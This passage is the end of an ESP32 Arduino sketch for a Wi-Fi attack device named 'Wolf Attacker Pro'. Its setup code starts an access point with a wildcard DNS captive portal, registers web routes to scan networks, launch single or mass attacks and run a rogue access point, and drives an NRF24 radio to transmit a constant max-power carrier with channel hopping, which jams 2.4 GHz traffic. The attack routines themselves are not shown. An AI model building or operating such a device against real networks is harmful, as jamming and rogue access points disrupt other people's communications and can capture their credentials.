  if (!nrfReady) { redirectHome(); return; }
  nrfJamming = !nrfJamming;
  if (nrfJamming) radio.startConstCarrier(RF24_PA_MAX, 45);
  else radio.stopConstCarrier();
  redirectHome();
}
#endif

// --------------- SETUP ------------------------
void setup() {
  Serial.begin(115200);
  pinMode(STATUS_LED, OUTPUT);
  setLed(false);
  delay(200);
  Serial.println("\n[Wolf Attacker Pro] booting...");

  // Random seed from RF noise
  srand(analogRead(0) ^ micros());

  WiFi.mode(WIFI_AP_STA);
  WiFi.softAP(AP_SSID, AP_PASS);
  IPAddress apIP = WiFi.softAPIP();
  Serial.print("AP IP: ");
  Serial.println(apIP);

  dnsServer.start(DNS_PORT, "*", apIP);
  applyTxPower();

  server.on("/", handleRoot);
  server.on("/scan", handleScan);
  server.on("/deepscan", handleDeepScan);
  server.on("/stop", handleStop);
  server.on("/settings", handleSettings);
  server.on("/toggle", handleToggle);
  server.on("/selectall", handleSelectAll);
  server.on("/selectopen", handleSelectOpen);
  server.on("/selecthidden", handleSelectHidden);
  server.on("/invert", handleInvert);
  server.on("/clear", handleClear);
  server.on("/attack", handleAttack);
  server.on("/attackall", handleAttackAll);
  server.on("/attackone", handleAttackOne);
  server.on("/resetstats", handleResetStats);
  server.on("/reboot", handleReboot);
  server.on("/rogue", handleRogue);
  server.on("/stoprogue", handleStopRogue);
#if USE_NRF24
  server.on("/nrf", handleNrf);
#endif
  server.onNotFound(handleRoot);
  server.begin();
  Serial.println("Web UI -> http://google.com  (or http://192.168.4.1)");

#if USE_NRF24
  nrfInit();
  Serial.println(nrfReady ? "NRF24 ready" : "NRF24 not found");
#endif

  Serial.println("[Wolf Attacker Pro] Ready!");
}

// --------------- MAIN LOOP --------------------
void loop() {
  dnsServer.processNextRequest();
  server.handleClient();

  // Rate calc every 1s
  if (millis() - lastPktMs >= 1000) {
    pktsLastSec = pktsWindow;
    if (pktsWindow > peakPktRate) peakPktRate = pktsWindow;
    pktsWindow = 0;
    lastPktMs = millis();
  }

  // Attack tick
  if (attacking) {
    runAttackTick();
    setLed((millis() / 200) % 2);
  }

  // Auto-scan every 60s if not attacking
  if (!attacking && millis() - lastScanMs > 60000 && scannedCount > 0) {
    // Do a quick background scan to keep the list fresh
    WiFi.scanNetworks(true); // async
    delay(1);
  }

#if USE_NRF24
  if (nrfReady && nrfJamming) nrfHop();
#endif
}
